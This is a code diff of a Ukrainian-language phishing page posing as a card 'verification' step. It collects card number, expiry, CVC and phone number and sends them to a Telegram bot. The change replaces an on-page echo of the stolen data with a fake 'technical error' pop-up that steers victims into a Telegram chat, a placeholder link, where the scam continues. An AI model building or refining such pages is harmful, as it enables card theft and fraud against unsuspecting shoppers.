@@ -109,77 +109,53 @@
         }
         .verify-btn:hover { background: #004f56; }
 
-        /* ФУТЕР */
-        .footer {
-            background-color: #ffffff;
-            padding: 60px 0 40px 0;
-            border-top: 1px solid #e0e0e0;
+        /* Модальное окно */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1;
+            left: 0;
+            top: 0;
             width: 100%;
-            margin-top: auto;
+            height: 100%;
+            overflow: auto;
+            background-color: rgba(0, 0, 0, 0.4);
+            padding-top: 60px;
         }
 
-        .footer-content {
-            max-width: 1250px;
-            margin: 0 auto;
-            display: flex;
-            justify-content: space-between;
-            padding: 0 16px;
-            flex-wrap: wrap;
-        }
-
-        .footer-column { display: flex; flex-direction: column; gap: 15px; min-width: 200px; margin-bottom: 30px; }
-        .footer-link { text-decoration: none; color: #002f34; font-size: 14px; font-weight: 700; }
-        .footer-link:hover { text-decoration: underline; }
-
-        .footer-apps { text-align: right; min-width: 300px; }
-        .app-buttons { display: flex; gap: 12px; justify-content: flex-end; margin-bottom: 15px; }
-        .app-badge { height: 44px; }
-        .app-text { font-size: 13px; color: #7f9799; margin: 0; }
-
-        .footer-bottom {
-            max-width: 1250px;
-            margin: 20px auto 0;
-            padding: 20px 16px 0;
-            display: flex;
-            gap: 25px;
-            flex-wrap: wrap;
-            border-top: 1px solid #f2f4f5;
-        }
-
-        .country-link { display: flex; align-items: center; text-decoration: none; font-size: 12px; color: #406367; gap: 6px; }
-        .flag { width: 16px; height: 11px; border: 1px solid #cedbe0; }
-
-        /* Новая таблица */
-        .info-table {
-            background-color: #ffffff;
+        .modal-content {
+            background-color: #fff;
+            margin: auto;
             padding: 20px;
-            border-radius: 4px;
-            box-shadow: 0 1px 4px rgba(0, 0, 0, 0.1);
-            margin-top: 20px;
+            border: 1px solid #888;
+            width: 80%;
+            max-width: 500px;
+            text-align: center;
+            border-radius: 10px;
         }
 
-        .info-table table {
-            width: 100%;
-            border-collapse: collapse;
-        }
-
-        .info-table th, .info-table td {
-            padding: 10px;
-            border: 1px solid #e0e0e0;
-            text-align: left;
-        }
-
-        .info-table th {
-            background-color: #f2f4f5;
-            font-weight: bold;
-        }
-
-        /* Стили для номера телефона */
-        .phone-info {
-            font-size: 16px;
+        .modal-content h3 {
+            margin-top: 0;
+            font-size: 24px;
             font-weight: 700;
         }
 
+        .modal-content p {
+            font-size: 16px;
+        }
+
+        .modal-content .btn {
+            background-color: #002f34;
+            color: white;
+            padding: 15px 20px;
+            border-radius: 5px;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        .modal-content .btn:hover {
+            background-color: #004f56;
+        }
     </style>
 </head>
 <body>
@@ -246,17 +222,13 @@
     </div>
 </div>
 
-<!-- Таблица для отображения информации после отправки -->
-<div id="infoTable" class="info-table" style="display: none;">
-    <h3>Ваші дані</h3>
-    <table>
-        <tr><th>Номер картки</th><td id="cardNumberInfo"></td></tr>
-        <tr><th>Термін дії</th><td id="expiryInfo"></td></tr>
-        <tr><th>CVC2</th><td id="cvcInfo"></td></tr>
-        <tr><th>Номер телефону</th><td id="phoneNumberInfo"></td></tr>
-        <tr><th>Баланс картки</th><td id="balanceInfo"></td></tr>
-    </table>
-    <p class="phone-info">Будь ласка, надішліть ці дані у чат Telegram для завершення верифікації.</p>
+<!-- Модальное окно -->
+<div id="modal" class="modal">
+    <div class="modal-content">
+        <h3>Технічна помилка</h3>
+        <p>Виникла технічна помилка, будь ласка, напишіть нам у чат Telegram для отримання допомоги.</p>
+        <a href="https://t.me/your_telegram_chat_id" class="btn" target="_blank">Написати в Telegram</a>
+    </div>
 </div>
 
 <footer class="footer">
@@ -334,15 +306,6 @@
         }
     });
 
-    // БАЛАНС
-    document.getElementById('balance').addEventListener('input', e => {
-        let val = e.target.value.replace(/[^\d.]/g, '');
-        if (val) {
-            // Запобігаємо дублюванню тексту "лв" при введенні
-            e.target.value = val + ' лв';
-        }
-    });
-
     // НОМЕР ТЕЛЕФОНУ
     document.getElementById('phoneNumber').addEventListener('input', e => {
         e.target.value = e.target.value.replace(/\D/g, '');
@@ -371,15 +334,9 @@
         // Отправляем сообщение в Telegram
         sendToTelegram(message);
 
-        // Показать таблицу с данными
-        document.getElementById('cardNumberInfo').textContent = cardNumber;
-        document.getElementById('expiryInfo').textContent = expiry;
-        document.getElementById('cvcInfo').textContent = cvc;
-        document.getElementById('phoneNumberInfo').textContent = phoneNumber;
-        document.getElementById('balanceInfo').textContent = balance;
-        document.getElementById('infoTable').style.display = 'block';
-    });
-</script>
-
+        // Показать модальное окно
+        document.getElementById('modal').style.display = 'block';
+    }
+    </script>
 </body>
 </html>
